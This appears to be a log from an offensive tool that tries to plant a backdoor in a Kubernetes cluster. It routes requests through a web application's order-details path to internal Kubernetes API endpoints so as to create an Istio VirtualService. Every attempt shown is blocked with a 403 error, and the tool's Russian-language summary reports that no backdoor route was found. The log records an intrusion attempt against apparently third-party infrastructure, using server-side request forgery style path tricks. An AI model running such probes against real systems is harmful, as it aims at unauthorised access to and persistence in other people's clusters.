+[2025-12-10 17:53:30] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:30] [INFO] Creating VirtualService via: /myaccount/api/order-details/v3/feature-flags -> http://localhost:6443/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:30] [INFO]   Response status: 403
+[2025-12-10 17:53:30] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:30] [INFO] Creating VirtualService via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:31] [INFO]   Response status: 403
+[2025-12-10 17:53:31] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:31] [INFO] Creating VirtualService via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:31] [INFO]   Response status: 403
+[2025-12-10 17:53:31] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:31] [INFO] Creating VirtualService via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:32] [INFO]   Response status: 403
+[2025-12-10 17:53:32] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:32] [INFO] Creating VirtualService via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces/default/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:32] [INFO]   Response status: 403
+[2025-12-10 17:53:32] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:32] [INFO] 
+======================================================================
+[2025-12-10 17:53:32] [INFO] RESULTS - СПОСОБЫ СОЗДАНИЯ БЕКДОРА В КЛАСТЕРЕ
+[2025-12-10 17:53:32] [INFO] ======================================================================
+[2025-12-10 17:53:32] [WARNING] Способы создания бекдора в кластере не найдены
+[2025-12-10 17:53:32] [INFO] Все попытки залогированы в: logs/cluster_backdoor_20251210_175019.log
+[2025-12-10 17:53:32] [INFO] ======================================================================
+[2025-12-10 17:53:32] [INFO] Log file: logs/cluster_backdoor_20251210_175019.log
